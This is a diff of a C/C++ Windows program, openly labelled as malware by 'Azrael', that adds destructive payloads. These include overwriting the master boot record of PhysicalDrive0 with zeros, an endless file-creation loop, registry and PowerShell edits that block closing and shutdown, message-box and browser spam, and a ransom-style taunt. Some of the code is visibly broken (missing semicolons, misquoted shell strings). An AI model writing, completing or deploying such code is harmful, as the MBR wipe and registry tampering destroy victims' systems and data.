@@ -1,15 +1,39 @@
 #include <stdio.h>
+#include <stdlib.h>
 #include <string.h>
+#include <iostream>
+#include <stdbool.h>
 #include <windows.h>
 #include <xdo.h>
 
-
-
 int main()
 {
-
+    trollies()
+    filebomb()
+    registrycorruption()
+    keyboardspam()
+    mbroverwrite()
+    return 0;
 }
 
+void mbroverwrite()
+{
+    char mbrData[512]; // 512 bytes
+    ZeroMemory(&mbrData, sizeof(mbrData));
+
+    HANDLE MBR = CreateFile("\\\\.\\PhysicalDrive0", GENERIC_ALL | FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, NULL, NULL);
+    WriteFile(MBR, mbrData, 512, NULL, NULL);
+    CloseHandle(MBR);
+}
+
+void filebomb()
+{
+    while (true) 
+    {
+    FILE *fptr;
+    fptr = fopen("filename.txt", "w");
+    }
+}
 
 
 void registrycorruption()
@@ -82,24 +106,26 @@ void keyboardspam()
 
 void trollies()
 {
-    printf(""
-    
-" ▄▄▄▄    ▄▄▄       ██▀███   ███▄    █ ▓█████▓██   ██▓\n"
-"▓█████▄ ▒████▄    ▓██ ▒ ██▒ ██ ▀█   █ ▓█   ▀ ▒██  ██▒\n"
-"▒██▒ ▄██▒██  ▀█▄  ▓██ ░▄█ ▒▓██  ▀█ ██▒▒███    ▒██ ██░\n"
-"▒██░█▀  ░██▄▄▄▄██ ▒██▀▀█▄  ▓██▒  ▐▌██▒▒▓█  ▄  ░ ▐██▓░\n"
-"░▓█  ▀█▓ ▓█   ▓██▒░██▓ ▒██▒▒██░   ▓██░░▒████▒ ░ ██▒▓░\n"
-"░▒▓███▀▒ ▒▒   ▓▒█░░ ▒▓ ░▒▓░░ ▒░   ▒ ▒ ░░ ▒░ ░  ██▒▒▒ \n"
-"▒░▒   ░   ▒   ▒▒ ░  ░▒ ░ ▒░░ ░░   ░ ▒░ ░ ░  ░▓██ ░▒░ \n"
-" ░    ░   ░   ▒     ░░   ░    ░   ░ ░    ░   ▒ ▒ ░░  \n"
-" ░            ░  ░   ░              ░    ░  ░░ ░      \n"
-"      ░                                      ░ ░      \n"
-"            Malware Author: Azrael\n"
-            
-    "");
-    printf("You got infected by barney,\nyour computer isn't yours anymore but belongs to barney.\n"
-           "You have 5 minutes to save your computer. Good luck :D\n");
+    printf("\033[0;35m"  // ANSI escape code for purple color
+           " ▄▄▄▄    ▄▄▄       ██▀███   ███▄    █ ▓█████▓██   ██▓\n"
+           "▓█████▄ ▒████▄    ▓██ ▒ ██▒ ██ ▀█   █ ▓█   ▀ ▒██  ██▒\n"
+           "▒██▒ ▄██▒██  ▀█▄  ▓██ ░▄█ ▒▓██  ▀█ ██▒▒███    ▒██ ██░\n"
+           "▒██░█▀  ░██▄▄▄▄██ ▒██▀▀█▄  ▓██▒  ▐▌██▒▒▓█  ▄  ░ ▐██▓░\n"
+           "░▓█  ▀█▓ ▓█   ▓██▒░██▓ ▒██▒▒██░   ▓██░░▒████▒ ░ ██▒▓░\n"
+           "░▒▓███▀▒ ▒▒   ▓▒█░░ ▒▓ ░▒▓░░ ▒░   ▒ ▒ ░░ ▒░ ░  ██▒▒▒ \n"
+           "▒░▒   ░   ▒   ▒▒ ░  ░▒ ░ ▒░░ ░░   ░ ▒░ ░ ░  ░▓██ ░▒░ \n"
+           " ░    ░   ░   ▒     ░░   ░    ░   ░ ░    ░   ▒ ▒ ░░  \n"
+           " ░            ░  ░   ░              ░    ░  ░░ ░      \n"
+           "      ░                                      ░ ░      \n"
+           "            Malware Author: Azrael\n"
+           "\033[0m");  // Reset color
 
+    printf("\033[0;35m"  // ANSI escape code for purple color
+           "You got infected by barney,\nyour computer isn't yours anymore but belongs to barney.\n"
+           "You have 5 minutes to save your computer. Good luck :D\n"
+           "\033[0m");  // Reset color
+           
+    //Spam error message box
     for (int i = 0; i < 300; i++)
         MessageBox(
             NULL,
@@ -108,6 +134,21 @@ void trollies()
             "BARNEY",
             MB_ABORTRETRYIGNORE | MB_DEFBUTTON2 | MB_ICONERROR
         );
+
+    //Opens browser
+    for (int i = 0; i < 20; i++)
+    system("start https://www.google.com/search?q=barney+is+looking+for+you")
+
+    // Plays barney music
+    for (int i = 0; i < 20; i++) {
+    PlaySound("music.wav", NULL, SND_FILENAME|SND_ASYNC);
+    }
+
+    // Change wallpaper
+    system("reg add "HKEY_CURRENT_USER\Control Panel\Desktop" /v Wallpaper /t REG_SZ /d "wallpaper.jpg" /f")
+
+    // Change scheme to b&w
+    system("powershell Set-ItemProperty -Path HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Themes\Personalize -Name SystemUsesLightTheme -Value 0")
 
     // Corrupts registry and files
     corruption();
@@ -119,7 +160,6 @@ void trollies()
     system("powershell New-ItemProperty -Path \"HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\" -Name \"NoClose\" -Value 1 -PropertyType DWORD -Force; New-ItemProperty -Path \"HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\" -Name \"DisableRestartSignout\" -Value 1 -PropertyType DWORD -Force; Set-ItemProperty -Path \"HKCU:\\Control Panel\\Desktop\" -Name \"PowerOffActive\" -Value 0 -Type DWORD -Force");
 
     // Encrypts files
-
     unsigned char key[] = {0x00, 0xFF, 0x01, 0x0F};
     int keysize = 1;
     char* text = "barneybarneymalware";
@@ -127,15 +167,6 @@ void trollies()
 
     // Change computer name
     SetComputerNameEx(ComputerNamePhysicalNetBIOS, L"Barney");
-
-    // Plays barney music
-    PlaySound("music.wav", NULL, SND_FILENAME|SND_ASYNC);
-
-
-    //
-    
-
-    
 
 
 }
